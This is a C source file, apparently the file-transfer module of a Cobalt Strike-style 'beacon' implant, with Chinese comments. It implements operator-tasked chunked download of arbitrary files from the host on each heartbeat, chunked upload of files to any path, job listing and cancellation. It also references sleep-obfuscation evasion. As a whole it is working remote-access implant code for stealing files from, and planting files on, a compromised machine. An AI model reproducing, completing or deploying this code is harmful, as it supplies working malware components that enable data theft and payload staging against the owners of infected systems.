#include "beacon_transfer.h"

#include "beacon_commands.h"
#include "beacon_context.h"
#include "beacon_crypto.h"

/*
 * 文件传输管理器：
 * download 采用分块轮询发送；upload 维护分块接收状态和取消缓存。
 */

#define TRANSFER_MIN_CHUNK_SIZE        (4 * 1024)
#define TRANSFER_DEFAULT_CHUNK_SIZE    (512 * 1024)
#define TRANSFER_MAX_CHUNK_SIZE        (1024 * 1024)
#define TRANSFER_DEFAULT_CHUNKS_PER_HB 3
#define TRANSFER_MAX_CHUNKS_PER_HB     16
#define TRANSFER_MAX_TOTAL_CHUNKS      1048576
#define TRANSFER_MAX_POLL_PLANS        16
#define TRANSFER_UPLOAD_CANCEL_TTL_SEC 3600

typedef struct DownloadReadPlan {
    UINT32 original_task_id;
    CHAR task_id[128];
    CHAR file_id[65];
    WCHAR remote_path[MAX_PATH * 2];
    INT chunk_size;
    INT total_chunks;
    INT first_chunk_index;
    INT chunk_count;
} DownloadReadPlan;

/* 将块大小限制在有效范围内 */
static INT TransferClampChunkSize(INT value)
{
    if (value <= 0) return TRANSFER_DEFAULT_CHUNK_SIZE;
    if (value < TRANSFER_MIN_CHUNK_SIZE) return TRANSFER_MIN_CHUNK_SIZE;
    if (value > TRANSFER_MAX_CHUNK_SIZE) return TRANSFER_MAX_CHUNK_SIZE;
    return value;
}

/* 将每次心跳块数限制在有效范围内 */
static INT TransferClampChunksPerHeartbeat(INT value)
{
    if (value <= 0) return TRANSFER_DEFAULT_CHUNKS_PER_HB;
    if (value > TRANSFER_MAX_CHUNKS_PER_HB) return TRANSFER_MAX_CHUNKS_PER_HB;
    return value;
}

/* 将单个文件下载块打包为用于传输的 ByteBuf */
static ByteBuf PackFileChunk(const CHAR* task_id, const CHAR* file_id, INT index, INT total, const BYTE8* data, SIZE_T len)
{
    ByteBuf p;
    BbInit(&p);
    BbString(&p, task_id);
    BbString(&p, file_id);
    BbU32(&p, (UINT32)index);
    BbU32(&p, (UINT32)total);
    BbBytes(&p, data, len);
    return p;
}

/* 打包包含块状态和可选错误文本的上传确认 */
static ByteBuf PackUploadAck(const CHAR* task_id, const CHAR* file_id, INT chunk_index, INT written, INT ok, const CHAR* error)
{
    ByteBuf p;
    BbInit(&p);
    BbString(&p, task_id);
    BbString(&p, file_id);
    BbU32(&p, (UINT32)chunk_index);
    BbU32(&p, (UINT32)written);
    BbU8(&p, (UINT8)(ok ? 1 : 0));
    BbString(&p, error ? error : "");
    return p;
}

/* 在链表中按任务 ID 查找下载状态条目（需持锁） */
static DownloadState* FindDownloadLocked(TransferManager* tm, const CHAR* task_id)
{
    DownloadState* s;
    for (s = tm->downloads; s; s = s->next) {
        if (!strcmp(s->task_id, task_id)) return s;
    }
    return NULL;
}

/* 按原始 job id 查找下载状态，用于 killjob/cancel 路径（需持锁） */
static DownloadState* FindDownloadByJobIdLocked(TransferManager* tm, UINT32 job_id)
{
    DownloadState* s;
    for (s = tm->downloads; s; s = s->next) {
        if (s->original_task_id == job_id) return s;
    }
    return NULL;
}

/* 按原始 job id 查找上传状态，用于 killjob/cancel 路径（需持锁） */
static UploadState* FindUploadByJobIdLocked(TransferManager* tm, UINT32 job_id)
{
    UploadState* s;
    for (s = tm->uploads; s; s = s->next) {
        if (s->original_task_id == job_id) return s;
    }
    return NULL;
}

/* 释放上传状态及其分块接收位图 */
static VOID FreeUploadState(UploadState* state)
{
    if (!state) return;
    if (state->received_map) {
        if (state->total_chunks > 0) {
            SecureZeroMemory(state->received_map, (SIZE_T)state->total_chunks);
        }
        HeapFree(GetProcessHeap(), 0, state->received_map);
        state->received_map = NULL;
    }
    SecureZeroMemory(state, sizeof(*state));
    HeapFree(GetProcessHeap(), 0, state);
}

/* 按任务 ID 移除并释放下载状态条目（需持锁） */
static VOID RemoveDownloadLocked(TransferManager* tm, const CHAR* task_id)
{
    DownloadState** pp = &tm->downloads;
    while (*pp) {
        DownloadState* cur = *pp;
        if (!strcmp(cur->task_id, task_id)) {
            *pp = cur->next;
            if (tm->ctx) RuntimeActivityEnd(tm->ctx);
            SecureZeroMemory(cur, sizeof(*cur));
            HeapFree(GetProcessHeap(), 0, (cur));
            return;
        }
        pp = &cur->next;
    }
}

/* 按任务 ID 移除并释放上传状态条目（需持锁） */
static VOID RemoveUploadLocked(TransferManager* tm, const CHAR* task_id)
{
    UploadState** pp = &tm->uploads;
    while (*pp) {
        UploadState* cur = *pp;
        if (!strcmp(cur->task_id, task_id)) {
            *pp = cur->next;
            if (tm->ctx) RuntimeActivityEnd(tm->ctx);
            FreeUploadState(cur);
            return;
        }
        pp = &cur->next;
    }
}

/* 清理过期的上传取消记录，避免取消表无限增长（需持锁） */
static VOID PruneUploadCancelsLocked(TransferManager* tm)
{
    UploadCancelEntry** pp = &tm->canceled_uploads;
    ULONGLONG now = GetUnixTimestamp();

    while (*pp) {
        UploadCancelEntry* cur = *pp;
        if (cur->expire_at <= now) {
            *pp = cur->next;
            SecureZeroMemory(cur, sizeof(*cur));
            HeapFree(GetProcessHeap(), 0, cur);
            continue;
        }
        pp = &cur->next;
    }
}

/* 检查上传任务是否已经被取消（需持锁） */
static BOOL IsUploadCanceledLocked(TransferManager* tm, const CHAR* task_id)
{
    UploadCancelEntry* cur;

    PruneUploadCancelsLocked(tm);
    for (cur = tm->canceled_uploads; cur; cur = cur->next) {
        if (!strcmp(cur->task_id, task_id ? task_id : "")) return TRUE;
    }
    return FALSE;
}

/* 记录一个上传取消项，用于拒绝后续迟到的分块（需持锁） */
static VOID AddUploadCancelLocked(TransferManager* tm, const CHAR* task_id)
{
    UploadCancelEntry* cur;

    if (!task_id || !task_id[0]) return;

    PruneUploadCancelsLocked(tm);
    for (cur = tm->canceled_uploads; cur; cur = cur->next) {
        if (!strcmp(cur->task_id, task_id)) {
            cur->expire_at = GetUnixTimestamp() + TRANSFER_UPLOAD_CANCEL_TTL_SEC;
            return;
        }
    }

    cur = (UploadCancelEntry*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*cur));
    if (!cur) return;
    strcpy_s(cur->task_id, sizeof(cur->task_id), task_id);
    cur->expire_at = GetUnixTimestamp() + TRANSFER_UPLOAD_CANCEL_TTL_SEC;
    cur->next = tm->canceled_uploads;
    tm->canceled_uploads = cur;
}

/* 从下载状态生成本轮读取计划，不修改进度（需持锁） */
static BOOL BuildDownloadReadPlanLocked(TransferManager* tm, DownloadState* state, DownloadReadPlan* plan)
{
    INT remaining;
    INT chunk_count;

    if (!tm || !state || !plan) return FALSE;

    ZeroMemory(plan, sizeof(*plan));
    if (state->next_chunk_index >= state->total_chunks) {
        CHAR done_task_id[128];
        strcpy_s(done_task_id, sizeof(done_task_id), state->task_id);
        RemoveDownloadLocked(tm, done_task_id);
        return FALSE;
    }

    remaining = state->total_chunks - state->next_chunk_index;
    chunk_count = remaining;
    if (chunk_count > state->chunks_per_heartbeat) {
        chunk_count = state->chunks_per_heartbeat;
    }
    if (chunk_count <= 0) return FALSE;

    plan->original_task_id = state->original_task_id;
    strcpy_s(plan->task_id, sizeof(plan->task_id), state->task_id);
    strcpy_s(plan->file_id, sizeof(plan->file_id), state->file_id);
    wcsncpy_s(plan->remote_path, ARRAYSIZE(plan->remote_path), state->remote_path, _TRUNCATE);
    plan->chunk_size = state->chunk_size;
    plan->total_chunks = state->total_chunks;
    plan->first_chunk_index = state->next_chunk_index;
    plan->chunk_count = chunk_count;

    return TRUE;
}

/* 成功读取并入队后提交下载进度；fatal 表示本次下载已不可恢复（需持锁） */
static VOID CommitDownloadReadPlanLocked(TransferManager* tm, const DownloadReadPlan* plan, INT chunks_done, BOOL fatal)
{
    DownloadState* state;

    if (!tm || !plan) return;

    state = FindDownloadLocked(tm, plan->task_id);
    if (!state) return;

    if (fatal) {
        RemoveDownloadLocked(tm, plan->task_id);
        return;
    }
    if (chunks_done <= 0) return;
    if (state->next_chunk_index != plan->first_chunk_index) return;

    state->next_chunk_index += chunks_done;
    if (state->next_chunk_index >= state->total_chunks) {
        CHAR done_task_id[128];
        strcpy_s(done_task_id, sizeof(done_task_id), state->task_id);
        RemoveDownloadLocked(tm, done_task_id);
    }
}

/* 按读取计划在锁外读取文件块并作为数据包入队，返回已入队块数；-1 表示致命失败 */
static INT ReadDownloadPlan(const DownloadReadPlan* plan, PacketList* out)
{
    HANDLE f = INVALID_HANDLE_VALUE;
    BYTE8* buf;
    INT i;
    INT chunks_done = 0;

    if (!plan || !out || plan->chunk_count <= 0 || plan->chunk_size <= 0) return 0;

    f = CreateFileW(plan->remote_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        ByteBuf e = BbFromText("open download file failed");
        PlistAdd(out, PacketMakeFinal(plan->original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
        BbFree(&e);
        return -1;
    }

    buf = (BYTE8*)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)plan->chunk_size);
    if (!buf) {
        ByteBuf e = BbFromText("allocate download buffer failed");
        PlistAdd(out, PacketMakeFinal(plan->original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
        BbFree(&e);
        CloseHandle(f);
        return -1;
    }

    for (i = 0; i < plan->chunk_count; ++i) {
        INT idx = plan->first_chunk_index + i;
        DWORD got = 0;
        ByteBuf payload;
        ByteBuf final;

        {
            LARGE_INTEGER pos;
            pos.QuadPart = (__int64)idx * plan->chunk_size;
            if (!SetFilePointerEx(f, pos, NULL, FILE_BEGIN)) {
                ByteBuf e = BbFromText("seek download file failed");
                PlistAdd(out, PacketMakeFinal(plan->original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
                BbFree(&e);
                chunks_done = -1;
                break;
            }
        }
        if (!ReadFile(f, buf, (DWORD)plan->chunk_size, &got, NULL)) {
            ByteBuf e = BbFromText("read download file failed");
            PlistAdd(out, PacketMakeFinal(plan->original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
            BbFree(&e);
            chunks_done = -1;
            break;
        }

        payload = PackFileChunk(plan->task_id, plan->file_id, idx, plan->total_chunks, buf, got);
        final = PacketMakeFinal(plan->original_task_id, BEACON_COMMAND_DOWNLOAD, &payload);
        BbFree(&payload);
        if (!PlistAdd(out, final)) {
            break;
        }
        ++chunks_done;
    }

    HeapFree(GetProcessHeap(), 0, (buf));
    CloseHandle(f);
    return chunks_done;
}

/* 使用空状态初始化传输管理器 */
/* 初始化传输管理器 */
VOID TransferInit(TransferManager* tm, BeaconContext* ctx)
{
    tm->ctx = ctx;
    InitializeCriticalSection(&tm->lock);
    tm->downloads = NULL;
    tm->uploads = NULL;
    tm->canceled_uploads = NULL;
}

/* 释放所有下载和上传状态，然后销毁锁 */
/* 释放传输管理器及所有传输任务 */
VOID TransferFree(TransferManager* tm)
{
    DownloadState* d = tm->downloads;
    UploadState* u = tm->uploads;
    UploadCancelEntry* c = tm->canceled_uploads;

    /* 释放所有下载状态 */
    while (d) {
        DownloadState* next = d->next;
        if (tm->ctx) RuntimeActivityEnd(tm->ctx);
        SecureZeroMemory(d, sizeof(*d));
        HeapFree(GetProcessHeap(), 0, (d));
        d = next;
    }

    /* 释放所有上传状态 */
    while (u) {
        UploadState* next = u->next;
        if (tm->ctx) RuntimeActivityEnd(tm->ctx);
        FreeUploadState(u);
        u = next;
    }

    while (c) {
        UploadCancelEntry* next = c->next;
        SecureZeroMemory(c, sizeof(*c));
        HeapFree(GetProcessHeap(), 0, c);
        c = next;
    }

    tm->downloads = NULL;
    tm->uploads = NULL;
    tm->canceled_uploads = NULL;
    DeleteCriticalSection(&tm->lock);
}

/* 处理下载请求：若为新请求则创建状态，然后读取并发送块 */
PacketList TransferHandleDownload(BeaconContext* ctx, UINT32 original_task_id, Parser* parser)
{
    TransferManager* tm = &ctx->transfers;
    PacketList out;
    CHAR* task_id = ParserString(parser);
    CHAR* remote = ParserString(parser);
    INT chunk_size = (INT)ParserU32(parser);
    INT chunks_per_heartbeat = (INT)ParserU32(parser);
    WCHAR* wremote = Utf8ToWide(remote);
    ByteBuf digest;
    UINT64 size = 0;
    UINT64 total_chunks64;
    DownloadReadPlan plan;
    DownloadState* state;
    BOOL has_plan = FALSE;
    BOOL activity_started = FALSE;

    PlistInit(&out);
    out.items_are_final = 1;
    BbInit(&digest);
    ZeroMemory(&plan, sizeof(plan));

    /* 验证已解析的字段 */
    if (parser->error[0] || !task_id[0] || !remote[0] || !wremote) {
        ByteBuf e = BbFromText(parser->error[0] ? parser->error : "invalid download request");
        PlistAdd(&out, PacketMakeFinal(original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
        BbFree(&e);
        goto cleanup;
    }

    chunk_size = TransferClampChunkSize(chunk_size);
    chunks_per_heartbeat = TransferClampChunksPerHeartbeat(chunks_per_heartbeat);

    if (!CryptoSha256File(wremote, &digest, &size)) {
        ByteBuf e = BbFromText("sha256/open download file failed");
        PlistAdd(&out, PacketMakeFinal(original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
        BbFree(&e);
        goto cleanup;
    }
    total_chunks64 = size == 0 ? 1 : (size + (UINT64)chunk_size - 1) / (UINT64)chunk_size;
    if (total_chunks64 > TRANSFER_MAX_TOTAL_CHUNKS) {
        ByteBuf e = BbFromText("download has too many chunks");
        PlistAdd(&out, PacketMakeFinal(original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
        BbFree(&e);
        goto cleanup;
    }

    /* 查找或创建下载状态 */
    EnterCriticalSection(&tm->lock);
    state = FindDownloadLocked(tm, task_id);
    if (!state) {
        if (!RuntimeActivityBegin(ctx)) {
            ByteBuf e = BbFromText("download blocked while sleep obfuscation is active");
            LeaveCriticalSection(&tm->lock);
            PlistAdd(&out, PacketMakeFinal(original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
            BbFree(&e);
            goto cleanup;
        }
        activity_started = TRUE;

        /* 分配并填充新的下载状态 */
        state = (DownloadState*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(1)*(sizeof(*state)));
        if (!state) {
            ByteBuf e = BbFromText("failed to allocate download state");
            if (activity_started) RuntimeActivityEnd(ctx);
            LeaveCriticalSection(&tm->lock);
            PlistAdd(&out, PacketMakeFinal(original_task_id, BEACON_COMMAND_DOWNLOAD, &e));
            BbFree(&e);
            goto cleanup;
        }
        state->original_task_id = original_task_id;
        strcpy_s(state->task_id, sizeof(state->task_id), task_id);
        strcpy_s(state->remote, sizeof(state->remote), remote);
        wcsncpy_s(state->remote_path, ARRAYSIZE(state->remote_path), wremote, _TRUNCATE);
        HexEncode(digest.data, digest.len, state->file_id, sizeof(state->file_id));
        state->chunk_size = chunk_size;
        state->chunks_per_heartbeat = chunks_per_heartbeat;
        state->total_chunks = (INT)total_chunks64;
        state->started_at = GetUnixTimestamp();
        state->next = tm->downloads;
        tm->downloads = state;
        activity_started = FALSE;
    }

    has_plan = BuildDownloadReadPlanLocked(tm, state, &plan);
    LeaveCriticalSection(&tm->lock);
    if (has_plan) {
        INT chunks_done = ReadDownloadPlan(&plan, &out);
        EnterCriticalSection(&tm->lock);
        CommitDownloadReadPlanLocked(tm, &plan, chunks_done, chunks_done < 0);
        LeaveCriticalSection(&tm->lock);
    }

cleanup:
    BbFree(&digest);
    HeapFree(GetProcessHeap(), 0, (task_id));
    HeapFree(GetProcessHeap(), 0, (remote));
    HeapFree(GetProcessHeap(), 0, (wremote));
    return out;
}

/* 处理上传请求：向目标文件写入块并发送确认 */
ByteBuf TransferHandleUpload(BeaconContext* ctx, UINT32 original_task_id, Parser* parser)
{
    TransferManager* tm = &ctx->transfers;
    CHAR* remote = ParserString(parser);
    CHAR* task_id = ParserString(parser);
    CHAR* file_id = ParserString(parser);
    INT chunk_index = (INT)ParserU32(parser);
    INT total_chunks = (INT)ParserU32(parser);
    ByteBuf data = ParserBytes(parser);
    WCHAR* wremote = Utf8ToWide(remote);
    HANDLE f = INVALID_HANDLE_VALUE;
    INT written = 0;
    INT ok = 1;
    INT chunk_size = 0;
    INT already_received = 0;
    CHAR err[128] = "";
    UploadState* st = NULL;

    /* 验证已解析的字段 */
    if (parser->error[0] || !remote[0] || !task_id[0] || !file_id[0] || !wremote) {
        strcpy_s(err, sizeof(err), parser->error[0] ? parser->error : "invalid upload request");
        ok = 0;
        goto done;
    }
    if (chunk_index < 0 || total_chunks <= 0 || chunk_index >= total_chunks) {
        strcpy_s(err, sizeof(err), "invalid upload chunk index");
        ok = 0;
        goto done;
    }
    if (total_chunks > TRANSFER_MAX_TOTAL_CHUNKS) {
        strcpy_s(err, sizeof(err), "upload has too many chunks");
        ok = 0;
        goto done;
    }
    if (data.len > TRANSFER_MAX_CHUNK_SIZE) {
        strcpy_s(err, sizeof(err), "upload chunk too large");
        ok = 0;
        goto done;
    }

    /* 查找或创建上传状态 */
    EnterCriticalSection(&tm->lock);
    if (IsUploadCanceledLocked(tm, task_id)) {
        strcpy_s(err, sizeof(err), "upload canceled");
        ok = 0;
        LeaveCriticalSection(&tm->lock);
        goto done;
    }

    for (st = tm->uploads; st; st = st->next) {
        if (!strcmp(st->task_id, task_id)) break;
    }
    if (!st) {
        if (chunk_index != 0) {
            strcpy_s(err, sizeof(err), "missing initial chunk to determine chunk size");
            ok = 0;
            LeaveCriticalSection(&tm->lock);
            goto done;
        }
        if (total_chunks > 1 && data.len == 0) {
            strcpy_s(err, sizeof(err), "invalid initial chunk size");
            ok = 0;
            LeaveCriticalSection(&tm->lock);
            goto done;
        }
        if (!RuntimeActivityBegin(ctx)) {
            strcpy_s(err, sizeof(err), "upload blocked while sleep obfuscation is active");
            ok = 0;
            LeaveCriticalSection(&tm->lock);
            goto done;
        }
        st = (UploadState*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(1)*(sizeof(*st)));
        if (!st) {
            RuntimeActivityEnd(ctx);
            strcpy_s(err, sizeof(err), "failed to allocate upload state");
            ok = 0;
            LeaveCriticalSection(&tm->lock);
            goto done;
        }
        st->original_task_id = original_task_id;
        strcpy_s(st->task_id, sizeof(st->task_id), task_id);
        strcpy_s(st->remote, sizeof(st->remote), remote);
        strcpy_s(st->file_id, sizeof(st->file_id), file_id);
        wcsncpy_s(st->remote_path, ARRAYSIZE(st->remote_path), wremote, _TRUNCATE);
        st->total_chunks = total_chunks;
        st->started_at = GetUnixTimestamp();
        st->received_map = (BYTE8*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)total_chunks);
        if (!st->received_map) {
            RuntimeActivityEnd(ctx);
            FreeUploadState(st);
            st = NULL;
            strcpy_s(err, sizeof(err), "failed to allocate upload receive map");
            ok = 0;
            LeaveCriticalSection(&tm->lock);
            goto done;
        }
        st->next = tm->uploads;
        tm->uploads = st;
    }
    if (ok) {
        if (strcmp(st->file_id, file_id) != 0 || st->total_chunks != total_chunks) {
            strcpy_s(err, sizeof(err), "upload transfer metadata mismatch");
            ok = 0;
        } else if (chunk_index == 0) {
            if (total_chunks > 1 && data.len == 0) {
                strcpy_s(err, sizeof(err), "invalid initial chunk size");
                ok = 0;
            } else if (st->chunk_size != 0 && st->chunk_size != (INT)data.len) {
                strcpy_s(err, sizeof(err), "upload chunk size mismatch");
                ok = 0;
            } else {
                st->chunk_size = (INT)data.len;
            }
        } else if (st->chunk_size == 0) {
            strcpy_s(err, sizeof(err), "missing initial chunk to determine chunk size");
            ok = 0;
        } else if (chunk_index + 1 < total_chunks && st->chunk_size != (INT)data.len) {
            strcpy_s(err, sizeof(err), "upload chunk size mismatch");
            ok = 0;
        }
    }
    if (ok) {
        chunk_size = st->chunk_size;
        already_received = st->received_map[chunk_index] ? 1 : 0;
    }
    LeaveCriticalSection(&tm->lock);
    if (!ok) goto done;

    if (already_received) {
        written = (INT)data.len;
        goto done;
    }

    EnterCriticalSection(&tm->lock);
    if (IsUploadCanceledLocked(tm, task_id)) {
        strcpy_s(err, sizeof(err), "upload canceled");
        ok = 0;
    }
    LeaveCriticalSection(&tm->lock);
    if (!ok) goto done;

    /* 打开目标文件进行写入 */
    f = CreateFileW(wremote, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        f = CreateFileW(wremote, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (f == INVALID_HANDLE_VALUE) {
        strcpy_s(err, sizeof(err), "open upload target failed");
        ok = 0;
        goto done;
    }

    /* 定位到块偏移量并写入数据 */
    {
        LARGE_INTEGER pos;
        DWORD n_written = 0;
        pos.QuadPart = (__int64)chunk_index * chunk_size;
        if (!SetFilePointerEx(f, pos, NULL, FILE_BEGIN) ||
            !WriteFile(f, data.data, (DWORD)data.len, &n_written, NULL)) {
            written = -1;
        } else {
            written = (INT)n_written;
        }
    }
    CloseHandle(f);
    f = INVALID_HANDLE_VALUE;
    if (written != (INT)data.len) {
        strcpy_s(err, sizeof(err), "write upload chunk failed");
        ok = 0;
    }
    if (ok) {
        EnterCriticalSection(&tm->lock);
        st = NULL;
        for (st = tm->uploads; st; st = st->next) {
            if (!strcmp(st->task_id, task_id)) break;
        }
        if (!st || !st->received_map) {
            strcpy_s(err, sizeof(err), "upload state not found");
            ok = 0;
        } else if (!st->received_map[chunk_index]) {
            st->received_map[chunk_index] = 1;
            st->received_chunks++;
            if (st->received_chunks >= st->total_chunks) {
                CHAR done_task_id[128];
                strcpy_s(done_task_id, sizeof(done_task_id), st->task_id);
                RemoveUploadLocked(tm, done_task_id);
            }
        }
        LeaveCriticalSection(&tm->lock);
    }

done:
    if (f != INVALID_HANDLE_VALUE) CloseHandle(f);
    HeapFree(GetProcessHeap(), 0, (remote));
    HeapFree(GetProcessHeap(), 0, (wremote));
    BbFree(&data);
    {
        /* 构建并返回上传确认 */
        ByteBuf ack = PackUploadAck(task_id ? task_id : "", file_id ? file_id : "", chunk_index, written, ok, err);
        HeapFree(GetProcessHeap(), 0, (task_id));
        HeapFree(GetProcessHeap(), 0, (file_id));
        return ack;
    }
}

/* 按 job_id 取消进行中的下载或上传任务 */
BOOL TransferCancelJob(BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
{
    TransferManager* tm;
    DownloadState* download;
    UploadState* upload;
    BOOL found = FALSE;
    const CHAR* type = NULL;

    if (!ctx || !out) return FALSE;
    tm = &ctx->transfers;

    EnterCriticalSection(&tm->lock);
    download = FindDownloadByJobIdLocked(tm, job_id);
    if (download) {
        type = "download";
        RemoveDownloadLocked(tm, download->task_id);
        found = TRUE;
    } else {
        upload = FindUploadByJobIdLocked(tm, job_id);
        if (upload) {
            type = "upload";
            AddUploadCancelLocked(tm, upload->task_id);
            RemoveUploadLocked(tm, upload->task_id);
            found = TRUE;
        }
    }
    LeaveCriticalSection(&tm->lock);

    if (found) {
        BbPrintf(out, "%s job %lu canceled", type, (ULONG)job_id);
    }
    return found;
}

/* 将所有活动的下载和上传任务追加到作业列表输出 */
VOID TransferAppendJobs(TransferManager* tm, ByteBuf* out, SIZE_T* count, ULONGLONG now)
{
    DownloadState* d;
    UploadState* u;

    if (!tm || !out || !count) return;

    EnterCriticalSection(&tm->lock);
    for (d = tm->downloads; d; d = d->next) {
        ULONGLONG age = now >= d->started_at ? now - d->started_at : 0;
        BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
                 (ULONG)d->original_task_id,
                 "download",
                 "running",
                 (unsigned __int64)age,
                 (ULONG)BEACON_COMMAND_DOWNLOAD,
                 "download",
                 d->task_id[0] ? d->task_id : "-",
                 d->remote[0] ? d->remote : "-");
        ++(*count);
    }
    for (u = tm->uploads; u; u = u->next) {
        ULONGLONG age = now >= u->started_at ? now - u->started_at : 0;
        BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
                 (ULONG)u->original_task_id,
                 "upload",
                 "running",
                 (unsigned __int64)age,
                 (ULONG)BEACON_COMMAND_UPLOAD,
                 "upload",
                 u->task_id[0] ? u->task_id : "-",
                 u->remote[0] ? u->remote : "-");
        ++(*count);
    }
    LeaveCriticalSection(&tm->lock);
}

/* 轮询所有活动下载并发送其待处理的块 */
PacketList TransferPoll(BeaconContext* ctx)
{
    TransferManager* tm = &ctx->transfers;
    PacketList out;
    DownloadReadPlan plans[TRANSFER_MAX_POLL_PLANS];
    INT plan_count = 0;
    INT i;

    PlistInit(&out);
    out.items_are_final = 1;
    ZeroMemory(plans, sizeof(plans));

    EnterCriticalSection(&tm->lock);
    for (DownloadState* s = tm->downloads; s && plan_count < TRANSFER_MAX_POLL_PLANS; ) {
        DownloadState* next = s->next;
        if (BuildDownloadReadPlanLocked(tm, s, &plans[plan_count])) {
            ++plan_count;
        }
        s = next;
    }
    LeaveCriticalSection(&tm->lock);

    for (i = 0; i < plan_count; ++i) {
        INT chunks_done = ReadDownloadPlan(&plans[i], &out);
        EnterCriticalSection(&tm->lock);
        CommitDownloadReadPlanLocked(tm, &plans[i], chunks_done, chunks_done < 0);
        LeaveCriticalSection(&tm->lock);
    }
    return out;
}
